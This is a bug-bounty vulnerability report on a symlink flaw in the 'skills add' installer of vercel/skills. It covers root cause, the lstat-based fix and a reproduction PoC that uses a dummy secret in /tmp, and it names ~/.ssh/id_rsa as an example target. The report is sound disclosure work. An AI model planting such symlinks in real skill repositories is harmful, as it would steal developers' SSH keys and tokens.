# [skills] - Symlink-based Local File Exfiltration via `skills add` allows sensitive file disclosure

## Summary
The `skills` CLI installer trusted file-system entries from untrusted skill repositories during copy operations. A malicious repository could include symlinks pointing to sensitive local paths (e.g. `~/.ssh/id_rsa`). During installation, those symlinks could be followed/dereferenced and copied into agent skill directories, exposing local secrets.

## Product / Target
- Program: Vercel Open Source Bug Bounty
- Repository: `vercel/skills` (Tier 2)
- Affected area: installer copy flow in `src/installer.ts`

## Severity (suggested)
**High** — local sensitive file disclosure and supply-chain abuse through normal `skills add` workflow.

## Affected versions
- Affected: versions before the symlink hardening patch (current branch includes fix).
- Patched behavior: skip symlink entries during copy and avoid unsafe dereference behavior for untrusted sources.

## Technical details
The vulnerable flow accepted repository contents as trusted and recursively copied entries from skill source directories. If symlink entries were dereferenced or followed, a symlink like `stolen.txt -> /home/victim/.ssh/id_rsa` could cause local secret material to be copied into installed skill folders.

### Root cause
- Untrusted skill source tree was processed without strict symlink rejection.
- Copy behavior allowed following symlink targets.

### Fix implemented
- Resolve each source entry metadata with `lstat`.
- Skip any entry where `isSymbolicLink()` is true.
- Gracefully skip entries that disappear mid-copy.

## Reproduction steps (PoC)
1. Create a malicious local skill repository with a symlink payload:
   ```bash
   mkdir -p /tmp/poc-skills/poc-symlink
   cat > /tmp/poc-skills/poc-symlink/SKILL.md <<'MD'
   ---
   name: poc-symlink
   description: symlink exfiltration poc
   ---
   MD

   echo 'super-secret-token' > /tmp/poc-secret.txt
   ln -s /tmp/poc-secret.txt /tmp/poc-skills/poc-symlink/stolen.txt
   ```
2. Install from vulnerable `skills` build:
   ```bash
   npx skills add /tmp/poc-skills --skill "poc-symlink" -y
   ```
3. Verify installed skill directory contains exfiltrated content (vulnerable):
   ```bash
   cat .agents/skills/poc-symlink/stolen.txt
   ```

## Expected vs. actual
- **Expected (secure):** symlink entries from untrusted source are ignored.
- **Actual (vulnerable):** symlink target content may be copied into installed skill directory.

## Impact
An attacker can publish a malicious skill repository that appears benign. Any developer installing it may unknowingly copy sensitive local files into skill directories. This can expose credentials, SSH keys, tokens, or proprietary code snippets if those directories are later shared, committed, or indexed.

## Mitigation / patch guidance
- Reject symlink entries in recursive copy of untrusted repositories.
- Use `lstat` for entry validation before traversal/copy.
- Never dereference symlinks from remote skill sources.
- Optionally log skipped symlink entries for transparency.

## References in fixed code
- `src/installer.ts` symlink-safe copy logic.
- `tests/symlink-safety.test.ts` regression test.
- `security/pocs/symlink-exfiltration/` PoC assets.

## Attached PoC ZIP
Generate PoC zip from repository:
```bash
bash security/pocs/symlink-exfiltration/build-poc-zip.sh
```
Output:
- `security/pocs/symlink-exfiltration/symlink-exfiltration-poc.zip`
